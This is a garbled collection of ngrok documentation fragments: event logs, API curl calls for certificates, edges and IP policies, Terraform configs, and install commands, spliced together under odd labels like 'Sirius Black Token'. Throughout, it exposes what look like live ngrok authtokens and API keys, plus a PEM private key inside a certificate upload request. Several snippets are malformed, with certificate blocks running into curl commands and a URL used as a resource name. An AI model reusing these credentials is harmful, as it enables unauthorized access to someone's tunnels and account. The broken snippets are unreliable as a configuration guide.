"metadata": "", "action": "allow" } }

{ "event_id": "ev_25X3yFS6TDkig1KDJWIc4nnJO0c", "event_type": "http_request_complete.v0", "event_timestamp": "2022-02-23T23:44:16Z", "account_id": "ac_2OtNvAlhso10Gx6s7eupzX3F98q", "object": { "conn": { "client_ip": "2601:0:8200:9e:4cd7:0:c97f:7823", "server_name": "ngrok-docs-example.ngrok.app", "server_port": "" }, "http": { "request": { "first_byte_ts": null, "last_byte_ts": null, "method": "GET", "url": { "path": "/docs/obs" }, "version": "HTTP/2.0" }, "response": { "body_length": 13079, "first_byte_ts": "2022-02-23T23:44:16.732791273Z", "last_byte_ts": "2022-02-23T23:44:16.737257209Z", "status_code": 200 } } } } { "event_id": "ev_25X4osod1q306srserDeFyghTC4", "event_type": "tcp_connection_closed.v0", "event_timestamp": "2022-02-23T23:51:14Z", "account_id": "ac_2OtNvAlhso10Gx6s7eupzX3F98q", "object": { "conn": { "bytes_in": 3437, "bytes_out": 90256, "client_ip": "2601:0:8200:9e:4cd7:0:c97f:7823", "end_ts": "2022-02-23T23:51:14.005372199Z", "server_name": "ngrok-docs-example.ngrok.app", "server_port": "", "start_ts": "2022-02-23T23:44:16.528374173Z" } } }

Tunnel Authentication Sirius Black Token '2bccY8aJWGzWp2AyhwB9Bi4JK4r_6BHRXwqzCW2NCXu7VLBf'

Grateful's actual bot user 🆔 'ak_2bcbwvXZPklwJuD7l1Ts7r7vEHr' Bot data 'bot_2bOqWXrxi75KWEKeNbXsIn2wpD7'

ngrok http 80 --verify-webhook twilio --verify-webhook-secret "{twilio webhook secret}" -----BEGIN CERTIFICATE----- ... -----END CERTIFICATE-------BEGIN CERTIFICATE-----curl \

... -----END CERTIFICATE-------BEGIN CERTIFICATE----- ... -----END CERTIFICATE----- -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/tls_certificates/cert_2bMmWcJj1yNwg3nr80d93h4j9Et curl -X POST -H "Authorization: Bearer {bot_2bOqWXrxi75KWEKeNbXsIn2wpD7}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"certificate_pem":"-----BEGIN CERTIFICATE-----\nMIIDDTCCAfWgAwIBAgIUBUunDdA4gjgtEbZA8w9Ljhvl3bEwDQYJKoZIhvcNAQEL\nBQAwFjEUMBIGA1UEAwwLZXhhbXBsZS5jb20wHhcNMjAwMzI0MTgxODE5WhcNMjAw\nNDIzMTgxODE5WjAWMRQwEgYDVQQDDAtleGFtcGxlLmNvbTCCASIwDQYJKoZIhvcN\nAQEBBQADggEPADCCAQoCggEBAPKVkkKYNl3d9cqrz4tIFlwsohED5W4y1dcBixy4\nGANFFnw43nc2wPyKwYXumJqJIFrcW/NkUZL07bd+dou6mT6Gh/zbaTW91IkREPXL\n7b3KfVu4XkFosVXpWs0U6o4GrZ81CLiKBWI+H03x/ij5OSiJ1l71pqLeTJLOydAR\nAl8kpp7axeHU4UbDrAZkW5SnuZTjIKwVg0UNsBg1yNfUOu1Uah3BYaqPgQitC0Yg\nLW+NUGu/T91bkD7tLsVInkQXeQGdXBAqOycfJ7wj8OlIpyuXjTnGFA0izVmbQw5f\nrQnZ0geGyhLamvz9Gcd7mIlD/+/AEN9Lht82tAOzKG98/O8CAwEAAaNTMFEwHQYD\nVR0OBBYEFKv6RsvEC6T+zCtJZwB0FCR1sEkhMB8GA1UdIwQYMBaAFKv6RsvEC6T+\nzCtJZwB0FCR1sEkhMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB\nAC5fBrouinespo5+9AipjhY/HOKTg+OCnppFnSnqeU1eXZZJ0oakdHTpTNxtbQP9\ntOJTA2f3KWvmpNDMohEQXZz8wHDkdbrIXJKVp6zs1pEp+0BIjA4y9mSywa5xuyk0\noGeChRgGqp2JujDyPCb7LEaKKQEEdMqy73QG+jEAh14+wKixlAf1nATBdeCUvssK\n2x1uZMyqjJFB5y/5EdnWQzD4WJkrsCkxsZHVMN1d+dqf2sf3dTRV8fzsFGOG17NS\n6u2n9iGcFdBA82XN8yeLIWhy1t3GWutG1sdxENbFRRXea+iUqzDsmRtkaBma2GLQ\nd6JTpFbsCtwDjP23UEi7SZo=\n-----END CERTIFICATE-----","private_key_pem":"-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDylZJCmDZd3fXK\nq8+LSBZcLKIRA+VuMtXXAYscuBgDRRZ8ON53NsD8isGF7piaiSBa3FvzZFGS9O23\nfnaLupk+hof822k1vdSJERD1y+29yn1buF5BaLFV6VrNFOqOBq2fNQi4igViPh9N\n8f4o+TkoidZe9aai3kySzsnQEQJfJKae2sXh1OFGw6wGZFuUp7mU4yCsFYNFDbAY\nNcjX1DrtVGodwWGqj4EIrQtGIC1vjVBrv0/dW5A+7S7FSJ5EF3kBnVwQKjsnHye8\nI/DpSKcrl405xhQNIs1Zm0MOX60J2dIHhsoS2pr8/RnHe5iJQ//vwBDfS4bfNrQD\nsyhvfPzvAgMBAAECggEBALLv7YE98exvi5zB+0fMFuJK8gkHDLequ93q/4hhqyTO\nU3WyJTdepiAi4fk/NEXZnIopPZJdj2aNUMQnfp43OE7MwYac+hBwRFQOyKnmkSmM\nMcf0SWKKLTUn+piIMzQsbOmhHxuwg6QiGslOFaJ3o9fpRL2rCg3dWDJ6Ypcd1NgE\nK0uy7gg+DwIpU6MeG6lA+HbxbGi+yd2x88Gjn9dGr7FZK34RUDooH60BCX9P8N9X\nT+n10MzzX7ZQOsLfe8FKc1/X8AybI5SYm1GMyfKD4QBt6JG4HKAjPHzBzcIpfN3d\n7BM11Imkrz7LcbUG+F23NVsi6n5IIGT1WqwCRIH2PpECgYEA/SJ5Ra4d0hUS5RYB\nzABquM3sp7JsKxCn7O5PqNLB4TgH9dXtWFhaFVB6juMGyHbvktVH0j4lps/Te0rk\nVU2zU1XxvCTFhtcCYUtNk0cRw6LH8feKiorXHdDRB33t0c47QSD/6AGOjBtxqD7B\n3ZxyR3P+7RdQopLLRFN+FHAnmzsCgYEA9VSGZDFSK+fbg4CgwkWdzuHrAXaUEv0U\novqqWd/yXB9wauEvRHnOrSgW6hFZQiatJOXx0KnalJQzohz/SLGO0MqGtwQbYWVT\nWiJgjUbNeiPEHBeUA6U55lVQr26kQSUWdXEtRbDz+hqV1K+6tTEMzaSPmJiHNgki\nlNMO2gqGQd0CgYBJ268qx5zn2UJEGWG41j5NYbg1TfgFsLxugzI2/heX0TNxZVP1\nPQI7ydmYq2ElSJ6qZxSnoX5255i7FqT8xskV/bOkw83mhAGrxb8Cw+/I90wDq8h+\nl/ggOPdkijfDybq8TBae6SVgd/l3r6f9M1KcypmNMApVBSPN8daNvBOyVQKBgQDo\nsj2utyFrx8Xsm4rf+kxOuPbBMooM4MQ8OmpuSP6G5sMofWLqHmcs0sO5TK9PEYRV\nZU3ST+ml2FSJRdvWRaRi4laZLWoTHZrL+aN/HVM0sMwIoUyhkIy0ruOTIuzlZZpB\n1xHL8qXX6nOHgw8jYdz1CUuyv6owVMXaR77kjer+eQKBgByYZlR/eNTzlot0SdFl\nIbgQ9bV7VLIo+vKzOXE3trfzRJMgUosLTp+5wdSVSW/VBdYZ7Ir3n0bbpY/dGinI\nVShxPbChhCZnhvG2lEEiekI44m5jHSA6hhtRdt/CrhL65Rw2SE5lMEe8htg1UGus\nwzLHWHBl72FjbjdhvEgrq60W\n-----END PRIVATE KEY-----"}' https://api.ngrok.com/tls_certificates

{ "id": "cert_2bMmWcJj1yNwg3nr80d93h4j9Et", "uri": "https://api.ngrok.com/tls_certificates/cert_2bMmWcJj1yNwg3nr80d93h4j9Et", "created_at": "2024-01-23T18:09:14Z", "certificate_pem": "-----BEGIN CERTIFICATE-----\nMIIDDTCCAfWgAwIBAgIUBUunDdA4gjgtEbZA8w9Ljhvl3bEwDQYJKoZIhvcNAQEL\nBQAwFjEUMBIGA1UEAwwLZXhhbXBsZS5jb20wHhcNMjAwMzI0MTgxODE5WhcNMjAw\nNDIzMTgxODE5WjAWMRQwEgYDVQQDDAtleGFtcGxlLmNvbTCCASIwDQYJKoZIhvcN\nAQEBBQADggEPADCCAQoCggEBAPKVkkKYNl3d9cqrz4tIFlwsohED5W4y1dcBixy4\nGANFFnw43nc2wPyKwYXumJqJIFrcW/NkUZL07bd+dou6mT6Gh/zbaTW91IkREPXL\n7b3KfVu4XkFosVXpWs0U6o4GrZ81CLiKBWI+H03x/ij5OSiJ1l71pqLeTJLOydAR\nAl8kpp7axeHU4UbDrAZkW5SnuZTjIKwVg0UNsBg1yNfUOu1Uah3BYaqPgQitC0Yg\nLW+NUGu/T91bkD7tLsVInkQXeQGdXBAqOycfJ7wj8OlIpyuXjTnGFA0izVmbQw5f\nrQnZ0geGyhLamvz9Gcd7mIlD/+/AEN9Lht82tAOzKG98/O8CAwEAAaNTMFEwHQYD\nVR0OBBYEFKv6RsvEC6T+zCtJZwB0FCR1sEkhMB8GA1UdIwQYMBaAFKv6RsvEC6T+\nzCtJZwB0FCR1sEkhMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB\nAC5fBrouinespo5+9AipjhY/HOKTg+OCnppFnSnqeU1eXZZJ0oakdHTpTNxtbQP9\ntOJTA2f3KWvmpNDMohEQXZz8wHDkdbrIXJKVp6zs1pEp+0BIjA4y9mSywa5xuyk0\noGeChRgGqp2JujDyPCb7LEaKKQEEdMqy73QG+jEAh14+wKixlAf1nATBdeCUvssK\n2x1uZMyqjJFB5y/5EdnWQzD4WJkrsCkxsZHVMN1d+dqf2sf3dTRV8fzsFGOG17NS\n6u2n9iGcFdBA82XN8yeLIWhy1t3GWutG1sdxENbFRRXea+iUqzDsmRtkaBma2GLQ\nd6JTpFbsCtwDjP23UEi7SZo=\n-----END CERTIFICATE-----\n", "subject_common_name": "example.com", "subject_alternative_names": { "dns_names": [], "ips": [] }, "issued_at": null, "not_before": "2020-03-24T18:18:19Z", "not_after": "2020-04-23T18:18:19Z", "key_usages": [], "extended_key_usages": [], "private_key_type": "rsa", "issuer_common_name": "example.com", "serial_number": "054ba70dd03882382d11b640f30f4b8e1be5ddb1", "subject_organization": "", "subject_organizational_unit": "", "subject_locality": "", "subject_province": "", "subject_country": "" }

DUNS # 000006

'edghtsrt_2b0vwyfS4hefz4fMo7Z9Mr6OfWy'

TUNNEL group Backend 'bkdtg_2b0vwsM7nbkREHxg8bDHm81vzXe' failover backend 'bkdfo_2b0vwxIMXb0AoED11AWnR1qJ0Al' HTTP Backend 'bkdhr_2b0vwxvB74HMoV9n9A5ma6MS5jn'

Global Domain 'https://lemming-topical-commonly.ngrok-free.app/'

'https://lemming-topical-commonly.ngrok-free.app/'

'https://lemming-topical-commonly.ngrok-free.app/'

'https://lemming-topical-commonly.ngrok-free.app/'

'https://lemming-topical-commonly.ngrok-free.app/'

backend identification 'edghtsrt_2b0vwyfS4hefz4fMo7Z9Mr6OfWy'

backend black 'edghtsrt_2b0wmZvfMaP5Pe014HWEtUT63KZ' endpoint backend 'edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9' Foundation Administration 'edghtsrt_2b0vwyfS4hefz4fMo7Z9Mr6OfWy'

docker run -it -e NGROK_AUTHTOKEN=2bTVg9fClAhPbL68J6xfOrgm0wX_5aMWASRkma1TdCsrjw75q ngrok/ngrok tunnel --label edge=edghts_2b0vwydaasYfluOXqlIGU3IFbS9 http://localhost:80 men in black clearance 'edghts_2b0vwydaasYfluOXqlIGU3IFbS9' sudo unzip ~/Downloads/ngrok-v3-stable-darwin-arm64.zip -d /usr/local/bin ngrok config add-authtoken 2bTVg9fClAhPbL68J6xfOrgm0wX_5aMWASRkma1TdCsrjw75q ngrok http http://localhost:8080 codesign --verify -d --verbose=2 /usr/local/bin/terraform

Executable=/usr/local/bin/terraform Identifier=terraform ... Authority=Developer ID Application: Hashicorp, Inc. (D38WU7D763) Authority=Developer ID Certification Authority Authority=Apple Root CA ... TeamIdentifier=D38WU7D763 ... wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list sudo apt update && sudo apt install terraform

brew tap hashicorp/tap brew install hashicorp/tap/terraform

Code generated for API Clients. DO NOT EDIT. resource "ngrok_api_key" "example" { description = "ad-hoc dev testing" metadata = "{"environment":"dev"}" }

Configure the ngrok provider provider "ngrok" { api_key = "2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ" }

Create a new reserved domain resource "ngrok_reserved_domain" "my_domain" { name = "my-domain.example.com" region = "us" certificate_management_policy { authority = "letsencrypt" private_key_type = "ecdsa" } }

Configure the ngrok provider provider "ngrok" { api_key = "{2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" }

Provision an ngrok domain resource "ngrok_reserved_domain" "https://lemming-topical-commonly.ngrok-free.app/" { name = "my-domain.example.com" region = "us" certificate_management_policy { authority = "letsencrypt" private_key_type = "ecdsa" } } ngrok config add-api-key "{2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" ngrok api endpoints list curl https://api.ngrok.com -H "authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "ngrok-version: 2" curl -X PATCH -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"metadata":"{"environment": "production"}"}' https://api.ngrok.com/edges/tcp/edgtcp_2bMmXM8nYzBUUlcHS6zbuPXBEnk curl -X PATCH -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"metadata":"{"environment": "production"}"}' https://api.ngrok.com/edges/tcp/edgtcp_2bMmXM8nYzBUUlcHS6zbuPXBEnk { "id": "edgtcp_2bMmXM8nYzBUUlcHS6zbuPXBEnk", "description": "acme tcp edge", "metadata": "{"environment": "production"}", "created_at": "2024-01-23T18:09:20Z", "uri": "https://api.ngrok.com/edges/tcp/edgtcp_2bMmXM8nYzBUUlcHS6zbuPXBEnk", "hostports": null, "backend": null, "ip_restriction": null, "policies": null } curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/tcp { "tcp_edges": [ { "id": "edgtcp_2bMmXM8nYzBUUlcHS6zbuPXBEnk", "description": "acme tcp edge", "metadata": "{"environment": "staging"}", "created_at": "2024-01-23T18:09:20Z", "uri": "https://api.ngrok.com/edges/tcp/edgtcp_2bMmXM8nYzBUUlcHS6zbuPXBEnk", "hostports": null, "backend": null, "ip_restriction": null, "policies": null } ], "uri": "https://api.ngrok.com/edges/tcp", "next_page_uri": null } curl -X POST -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"description":"acme tcp edge","metadata":"{"environment": "staging"}"}' https://api.ngrok.com/edges/tcp curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/tcp/edgtcp_2bMmXM8nYzBUUlcHS6zbuPXBEnk

curl -X PATCH -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"ip_policy_ids":["ipp_2bMmWevCfjIjS5dolQMi5IS7JFg","ipp_2bMmWfb5W8B9Hi0dHMTwQkseIYV"]}' https://api.ngrok.com/ip_restrictions/ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ

curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/ip_restrictions { "ip_restrictions": [ { "id": "ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ", "uri": "https://api.ngrok.com/ip_restrictions/ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ", "created_at": "2024-01-23T18:09:14Z", "enforced": false, "type": "dashboard", "ip_policies": [ { "id": "ipp_2bMmWevCfjIjS5dolQMi5IS7JFg", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWevCfjIjS5dolQMi5IS7JFg" } ] } ], "uri": "https://api.ngrok.com/ip_restrictions", "next_page_uri": null } curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/ip_restrictions/ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ { "id": "ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ", "uri": "https://api.ngrok.com/ip_restrictions/ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ", "created_at": "2024-01-23T18:09:14Z", "enforced": false, "type": "dashboard", "ip_policies": [ { "id": "ipp_2bMmWevCfjIjS5dolQMi5IS7JFg", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWevCfjIjS5dolQMi5IS7JFg" }, { "id": "ipp_2bMmWfb5W8B9Hi0dHMTwQkseIYV", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWfb5W8B9Hi0dHMTwQkseIYV" } ] } curl -X POST -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"type":"dashboard","ip_policy_ids":["ipp_2bMmWevCfjIjS5dolQMi5IS7JFg"]}' https://api.ngrok.com/ip_restrictions { "id": "ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ", "uri": "https://api.ngrok.com/ip_restrictions/ipx_2bMmWc1wqpsOUVP4H6EgqdIA9oQ", "created_at": "2024-01-23T18:09:14Z", "enforced": false, "type": "dashboard", "ip_policies": [ { "id": "ipp_2bMmWevCfjIjS5dolQMi5IS7JFg", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWevCfjIjS5dolQMi5IS7JFg" } ] }

curl -X PATCH -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"cidr":"212.3.15.0/24"}' https://api.ngrok.com/ip_policy_rules/ipr_2bMmWXfn5EKyQVA3FqQdQPyb60i

curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/ip_policy_rules { "ip_policy_rules": [ { "id": "ipr_2bMmWXfn5EKyQVA3FqQdQPyb60i", "uri": "https://api.ngrok.com/ip_policy_rules/ipr_2bMmWXfn5EKyQVA3FqQdQPyb60i", "created_at": "2024-01-23T18:09:13Z", "description": "nyc office", "cidr": "212.3.14.0/24", "ip_policy": { "id": "ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ" }, "action": "allow" }, { "id": "ipr_2bMmWVF4GwG3oKF1lW0IeiYysKd", "uri": "https://api.ngrok.com/ip_policy_rules/ipr_2bMmWVF4GwG3oKF1lW0IeiYysKd", "created_at": "2024-01-23T18:09:13Z", "description": "sf office", "cidr": "132.2.19.0/24", "ip_policy": { "id": "ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ" }, "action": "allow" }, { "id": "ipr_2bMmWU2KgbDxSxzPFluW1YS9aoF", "uri": "https://api.ngrok.com/ip_policy_rules/ipr_2bMmWU2KgbDxSxzPFluW1YS9aoF", "created_at": "2024-01-23T18:09:13Z", "description": "alan laptop", "cidr": "2.2.2.2/32", "ip_policy": { "id": "ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ" }, "action": "allow" } ], "uri": "https://api.ngrok.com/ip_policy_rules", "next_page_uri": null }

curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/ip_policy_rules/ipr_2bMmWXfn5EKyQVA3FqQdQPyb60i { "id": "ipr_2bMmWXfn5EKyQVA3FqQdQPyb60i", "uri": "https://api.ngrok.com/ip_policy_rules/ipr_2bMmWXfn5EKyQVA3FqQdQPyb60i", "created_at": "2024-01-23T18:09:13Z", "description": "nyc office", "cidr": "212.3.15.0/24", "ip_policy": { "id": "ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ" }, "action": "allow" } curl -X POST -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"description":"nyc office","cidr":"212.3.14.0/24","ip_policy_id":"ipp_2bMmWWFWmR7ComTMLOYsvSZVXQZ","action":"allow"}' https://api.ngrok.com/ip_policy_rules

curl -X PATCH -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"metadata":"metadata={"pod-id": "b3d9c464-4f48-4783-a741-d7d7d5db310f"}"}' https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm

{ "id": "ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "created_at": "2024-01-23T18:08:52Z", "description": "API Outbound Gateway", "metadata": "metadata={"pod-id": "b3d9c464-4f48-4783-a741-d7d7d5db310f"}" } curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/ip_policies { "ip_policies": [ { "id": "ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "created_at": "2024-01-23T18:08:52Z", "description": "API Outbound Gateway" }, { "id": "ipp_2bMmTrLwuYPTUgWKsZV9KbwQCJ7", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmTrLwuYPTUgWKsZV9KbwQCJ7", "created_at": "2024-01-23T18:08:52Z", "description": "Developer Environments" } ], "uri": "https://api.ngrok.com/ip_policies", "next_page_uri": null } curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm { "id": "ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "created_at": "2024-01-23T18:08:52Z", "description": "API Outbound Gateway", "metadata": "metadata={"pod-id": "b3d9c464-4f48-4783-a741-d7d7d5db310f"}" } curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm { "id": "ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "created_at": "2024-01-23T18:08:52Z", "description": "API Outbound Gateway", "metadata": "metadata={"pod-id": "b3d9c464-4f48-4783-a741-d7d7d5db310f"}" } curl -X POST -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"description":"API Outbound Gateway"}' https://api.ngrok.com/ip_policies { "id": "ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "uri": "https://api.ngrok.com/ip_policies/ipp_2bMmTsrHicsdjfSt6jCUlNa3nBm", "created_at": "2024-01-23T18:08:52Z", "description": "API Outbound Gateway" } curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/https/edghts_2bMmXUJV6pkem9Gb9RTfI86KyNI/tls_termination { "enabled": true, "terminate_at": "edge", "min_version": "1.3" } curl -X PUT -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"enabled":true,"min_version":"1.3"}' https://api.ngrok.com/edges/https/edghts_2bMmXUJV6pkem9Gb9RTfI86KyNI/tls_termination

curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/https/edghts_2bMmXOcKR64QqFa8q1fI6OBoU7i/routes/edghtsrt_2bMmXN1WwZhK3p4mBHgLIhVP8SL/websocket_tcp_converter { "enabled": true } curl -X PUT -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"enabled":true}' https://api.ngrok.com/edges/https/edghts_2bMmXOcKR64QqFa8q1fI6OBoU7i/routes/edghtsrt_2bMmXN1WwZhK3p4mBHgLIhVP8SL/websocket_tcp_converter { "enabled": true }

curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/https/edghts_2bMmXMcOjoq8S1BvJN3HYY5b7F4/routes/edghtsrt_2bMmXL0vXPehNqON4Q4gEEByT6Q/webhook_verification curl -X PUT -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"enabled":true,"provider":"TWILIO","secret":"secret_token"}' https://api.ngrok.com/edges/https/edghts_2bMmXMcOjoq8S1BvJN3HYY5b7F4/routes/edghtsrt_2bMmXL0vXPehNqON4Q4gEEByT6Q/webhook_verification { "enabled": true, "provider": "TWILIO", "secret": "secret_token" } curl -X DELETE -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/https/edghts_2bMmXLm72GkoHS8tCdzOuTQcG5r/routes/edghtsrt_2bMmXQ1tcvPsx0op3cx8T1C1WSO/user_agent_filter

curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/https/edghts_2bMmXLm72GkoHS8tCdzOuTQcG5r/routes/edghtsrt_2bMmXQ1tcvPsx0op3cx8T1C1WSO/user_agent_filter { "enabled": true, "allow": ["(Pingdom.com_bot_version_)(\d+).(\d+)"], "deny": ["(made_up_bot)/(\d+).(\d+)"] } curl -X PUT -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"enabled":true,"allow":["(Pingdom.com_bot_version_)(\d+).(\d+)"],"deny":["(made_up_bot)/(\d+).(\d+)"]}' https://api.ngrok.com/edges/https/edghts_2bMmXLm72GkoHS8tCdzOuTQcG5r/routes/edghtsrt_2bMmXQ1tcvPsx0op3cx8T1C1WSO/user_agent_filter { "enabled": true, "allow": ["(Pingdom.com_bot_version_)(\d+).(\d+)"], "deny": ["(made_up_bot)/(\d+).(\d+)"] } curl -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/edges/https/edghts_2bMmXGZh5RnDO7bAgszNuVae4M3/routes/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN/saml { "enabled": true, "options_passthrough": false, "cookie_prefix": "", "inactivity_timeout": 0, "maximum_duration": 0, "idp_metadata_url": "", "idp_metadata": "\n\u003cEntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" 